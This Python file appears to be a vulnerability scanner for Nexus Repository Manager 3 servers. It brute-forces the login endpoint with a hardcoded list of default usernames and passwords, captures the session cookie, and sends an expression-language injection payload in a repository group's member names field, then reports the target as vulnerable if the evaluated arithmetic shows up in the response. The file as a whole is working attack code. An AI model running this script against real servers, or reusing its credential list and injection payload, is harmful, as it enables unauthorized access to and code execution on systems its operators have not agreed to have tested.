import requests,re,urllib3,urllib,base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(url):
		total=[]
		n=0
		user_list=['admin','nexus','Nexus']
		pass_list=['admin','admin123','123456','Admin','Admin123','Nexus','nexus','Nsf0cus@123','Nsf0cus@567']
		response = requests.get(url,verify=False,timeout=10)
		if "Nexus" in response.text:
			if 'Nexus/2' in response.headers['Server']:
				return False
			else:
				if url[-1] == '/':
					vuln_url = url + "service/rapture/session"
				else:
					vuln_url = url + "/service/rapture/session"  
				for username in user_list:
					for password in pass_list:
						total.append((username,password))
				for c in total:
					username=c[0]
					password=c[1]
					body='username='+base64.b64encode(username.encode()).decode().replace('+','%2B').replace('=','%3D').replace('/','%2F')+'&password='+base64.b64encode(password.encode()).decode().replace('+','%2B').replace('=','%3D').replace('/','%2F')
					headers={
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
					'Accept': '*/*',
					'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
					'X-Nexus-UI': 'true',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'X-Requested-With': 'XMLHttpRequest',
					'Content-Length': '46',
					'Connection': 'close',
					'Cookie': '_ga=GA1.2.236010153.1636511101; _gid=GA1.2.2009212609.1636511101; _gcl_au=1.1.35658916.1636511101; _ga=GA1.3.236010153.1636511101; _gid=GA1.3.2009212609.1636511101'
					}
					r=requests.post(vuln_url,body,headers=headers,verify=False)
					if r.status_code!=403 and 'NXSESSIONID' in r.headers['Set-Cookie']:
						NXSESSIONID=re.findall('NXSESSIONID=(.+?);',str(r.headers))[0]
						if url[-1] == '/':
							url3 = url + "service/rest/beta/repositories/go/group"
						else:
							url3 = url + "/service/rest/beta/repositories/go/group"
						headers={
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
						'Accept': '*/*',
						'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
						'Accept-Encoding': 'gzip, deflate, br',
						'X-Nexus-UI': 'true',
						'NX-ANTI-CSRF-TOKEN': '1',
						'Content-Type': 'application/json',
						'X-Requested-With': 'XMLHttpRequest',
						'Content-Length': '195',
						'Connection': 'close',
						'Sec-Fetch-Site': 'same-origin',
						'Sec-Fetch-Mode': 'cors',
						'Cookie': 'NX-ANTI-CSRF-TOKEN=1; NXSESSIONID='+NXSESSIONID
						}
						body='''
						{
						  "name": "internal",\r
						  "online": true,\r
						  "storage": {\r
						    "blobStoreName": "default",\r
						    "strictContentTypeValidation": true\r
						  },\r
						  "group": {\r
						    "memberNames": ["$\\\\A{233*233*233}"]\r
						  }
						}
						'''
						r=requests.post(url3,body,headers=headers,verify=False)
						# print(r.text)
						if 'A12649337' in r.text:
							return True
							break
						else:
							return False
							break
					else:
						n+=1
				if n==len(total):
					return False
		else:
			return False

